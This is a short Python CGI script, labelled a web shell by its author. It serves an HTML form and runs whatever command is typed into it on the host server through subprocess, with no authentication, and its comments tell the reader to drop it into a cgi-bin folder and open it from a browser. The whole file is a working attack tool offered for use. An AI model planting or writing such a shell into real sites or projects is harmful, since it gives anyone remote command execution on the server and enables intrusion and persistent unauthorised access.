#!/usr/bin/env python3

# This code is python based CGI web shell, works with CGI enabled web server.
# copy the python code into cgi-bin folder and then manually access the path from browser
# Author: B31212Y

print ("Content-Type: text/html")
print()

print("<!doctype html>")
print("<html>")
print("<head>")
print("<title> CGI Web Shell </title>")
print("</head>")
print("<body>")
print("<form name = 'shellform' method = 'POST' action = 'cgi-shell.py'>")
print("Enter the command: <br>")
print("<input type = 'text' name = 'cmd_name'/><br>")
print("<input type= 'submit' value = 'submit'>")
print("</form>")
print("</body>")
print("</html>")


import subprocess
import shlex
import cgi
import cgitb


form = cgi.FieldStorage()
if "cmd_name" in form:
	name = form.getvalue("cmd_name")


	try:
		# shlex module for shell like syantaxes
		cmd = shlex.split(name)
		cmd_handle = subprocess.Popen(cmd, stdin = subprocess.PIPE, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
		print(cmd_handle.stdout.read().decode())
		
	except:
		print("Kindly enter the correct command!")



